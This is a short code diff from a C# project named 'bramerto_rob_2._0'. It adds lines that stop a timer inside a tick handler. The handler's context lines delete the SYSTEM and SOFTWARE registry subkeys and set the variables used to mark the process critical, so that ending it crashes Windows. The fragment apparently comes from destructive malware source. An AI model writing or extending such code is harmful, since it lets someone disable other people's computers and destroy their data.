@@ -78,6 +78,8 @@ namespace bramerto_rob_2._0
 
         private void Timer2_Tick(object sender, EventArgs e)
         {
+            timer2.Enabled = false;
+            timer2.Stop();
             s.DeleteSubKey(@"SYSTEM", @"System", @"SOFTWARE");
             int isCritical = 1;  
             int BreakOnTermination = 0x1D;
